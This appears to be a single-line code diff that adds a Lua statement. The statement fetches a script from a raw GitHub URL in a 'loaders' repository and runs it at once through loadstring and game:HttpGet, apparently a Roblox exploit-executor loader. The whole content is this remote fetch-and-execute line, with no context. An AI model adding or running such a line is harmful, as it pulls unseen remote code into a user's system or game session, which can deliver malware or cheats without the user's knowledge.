@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/hide-in-pixels-spam4-0r9gn1r6f0z7tw.lua"))()
